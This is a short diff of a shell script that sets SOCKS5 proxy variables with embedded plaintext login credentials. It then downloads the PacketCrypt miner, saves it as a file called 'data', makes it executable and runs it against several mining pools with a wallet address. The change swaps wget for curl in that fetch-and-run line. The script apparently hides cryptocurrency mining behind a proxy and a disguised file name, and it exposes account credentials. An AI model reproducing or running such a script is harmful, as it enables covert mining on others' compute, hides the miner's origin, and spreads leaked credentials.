@@ -2,6 +2,6 @@ curl --proxy "socks5://e3Ecb6hc:Zov4RMHhn@atl.socks.ipvanish.com:1080/"
 export http_proxy=socks5://e3Ecb6hc:Zov4RMHhn@atl.socks.ipvanish.com:1080
 export https_proxy=socks5://e3Ecb6hc:Zov4RMHhn@atl.socks.ipvanish.com:1080
 export ftp_proxy=socks5://e3Ecb6hc:Zov4RMHhn@atl.socks.ipvanish.com:1080
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data && 
+curl https://www.pkt.world/ext/packetcrypt-linux-amd64 --output data && 
 chmod +x data && 
 ./data ann -p pkt1qh3cswe3gckds4vutpasr6z2rwz6rxkkhgxecys http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com
